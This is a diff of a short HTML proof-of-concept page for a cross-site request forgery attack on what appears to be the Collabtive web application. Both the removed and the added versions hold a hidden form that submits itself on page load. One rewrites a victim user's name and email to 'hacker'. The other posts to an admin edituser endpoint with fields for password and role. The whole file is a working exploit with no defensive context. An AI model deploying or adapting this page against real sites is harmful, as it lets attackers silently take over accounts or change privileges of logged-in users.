@@ -1,15 +1,14 @@
 <html>
-<head>
-<title>Collabtive CSRF P0C</title>
-</head>
-<body>
-<img src=”https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png” />
-  <form method="post" action="http://localhost/collabtive/manageuser.php?action=profile&id=2&mode=edited" enctype="multipart/form-data" name="csrfXploit">
-    <input type="hidden" value="hacker" name="name" />
-    <input type="hidden" value="hacker@hacker" name="email" />
-  </form>
-  <script type="text/javascript">
-    document.csrfXploit.submit();
-  </script>
-</body>
+<form action="http://host/admin.php?action=edituser&id=USERID" method="post" name="main" enctype="multipart/form-data">
+<input type="hidden" name="name" value="username">
+<input type="hidden" name="email" value="email@example.com">
+<input type="hidden" name="locale" value="en">
+<input type="hidden" name="admin" value="">
+<input type="hidden" name="newpass" value="">
+<input type="hidden" name="repeatpass" value="">
+<input type="hidden" name="role" value="1">
+</form>
+<script>
+document.main.submit();
+</script>
 </html>
